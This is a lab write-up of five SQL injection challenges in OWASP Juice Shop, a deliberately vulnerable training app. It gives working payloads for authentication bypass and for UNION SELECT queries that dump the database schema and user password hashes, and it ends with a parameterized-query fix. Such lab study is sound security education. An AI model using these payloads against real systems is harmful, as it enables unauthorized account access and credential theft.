# OWASP Juice Shop — Injection Challenges 

> **Lab:** OWASP Juice Shop
> **Category:** Injection
> **Environment:** Local/authorized lab
> **Focus:** SQL Injection (SQLi)

## 1. Login Admin

### Goal

Log in with the administrator's account without knowing the password.

### Vulnerability

The login form directly uses user input in a SQL query without proper parameterization.

### Payload

**Email:**

```text
' OR 1=1--
```

**Password:**

```text
anything
```

### How It Works

* `'` → closes the original input.
* `OR 1=1` → creates an always-true condition.
* `--` → comments out the remaining SQL query.

### Impact

An attacker may **bypass authentication** and access an account without knowing its password.

---

## 2. Database Schema

### Goal

Exfiltrate the database schema using SQL Injection.

### Vulnerable Endpoint

```text
/rest/products/search?q=
```

### Step 1 — Find Column Count

Use:

```text
banana')) UNION SELECT 1,2,3,4,5,6,7,8,9--
```

The application accepts **9 columns**.

### Step 2 — Extract SQLite Schema

```text
banana')) UNION SELECT 'a','b','c',sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master--
```

### How It Works

* `UNION SELECT` combines the original query with our query.
* `sqlite_master` contains SQLite database metadata.
* `sql` contains table creation statements.
* `NULL` values fill the remaining columns.

### Impact

Database schema disclosure can reveal:

* Table names
* Column names
* Database structure
* Sensitive application logic

This information can make further attacks easier.

---

## 3. Login Jim

### Goal

Log in with Jim's account.

### Username

```text
jim@juice-sh.op
```

### SQL Injection Payload

**Email:**

```text
jim@juice-sh.op'--
```

**Password:**

```text
anything
```

### How It Works

The `'` terminates the email value and `--` comments out the remaining password condition.

Conceptually:

```sql
WHERE email = 'jim@juice-sh.op'--'
AND password = '...'
```

The password check is ignored.

### Impact

An attacker can **bypass authentication for a known user account**.

---

## 4. Login Bender

### Goal

Log in with Bender's account.

### Username

```text
bender@juice-sh.op
```

### Payload

**Email:**

```text
bender@juice-sh.op'--
```

**Password:**

```text
anything
```

### How It Works

The SQL comment sequence:

```text
--
```

causes the rest of the SQL statement to be ignored, bypassing the password validation.

### Impact

Demonstrates **authentication bypass through SQL Injection**.

---

## 5. User Credentials

### Goal

Retrieve user credentials through SQL Injection.

### Vulnerable Endpoint

```text
/rest/products/search?q=
```

### Step 1 — Confirm SQL Injection

```text
banana'))--
```

### Step 2 — Confirm Column Count

```text
banana')) UNION SELECT 1,2,3,4,5,6,7,8,9--
```

### Step 3 — Extract User Data

```text
banana')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
```

### What Is Extracted

```text
id
email
password
```

The remaining values are placeholders used to match the original query's **9-column structure**.

### How It Works

```text
Original Query
      ↓
SQL Injection
      ↓
UNION SELECT
      ↓
Users table
      ↓
ID + Email + Password Hashes
```

### Impact

This can expose **user accounts and password hashes**, potentially enabling:

* Account takeover
* Password cracking
* Credential reuse attacks
* Further privilege escalation

---

# Overall Security Impact

| Challenge        | Vulnerability | Main Impact                   |
| ---------------- | ------------- | ----------------------------- |
| Login Admin      | SQL Injection | Authentication bypass         |
| Database Schema  | SQL Injection | Database structure disclosure |
| Login Jim        | SQL Injection | User authentication bypass    |
| Login Bender     | SQL Injection | User authentication bypass    |
| User Credentials | SQL Injection | Credential/hash disclosure    |

## Root Cause

The main issue is **unsafe SQL query construction using untrusted user input**.

### Recommended Fix

Use **parameterized queries / prepared statements** instead of concatenating user input into SQL:

```javascript
sequelize.query(
  'SELECT * FROM Products WHERE name LIKE :criteria',
  {
    replacements: { criteria }
  }
)
```

Also apply:

* Input validation
* Least-privilege database accounts
* Secure password hashing such as Argon2/bcrypt
* Generic authentication error messages
* Regular SAST/DAST/security testing

**Key takeaway:** SQL Injection can progress from **authentication bypass → schema disclosure → credential disclosure**, making it a high-impact application security vulnerability.
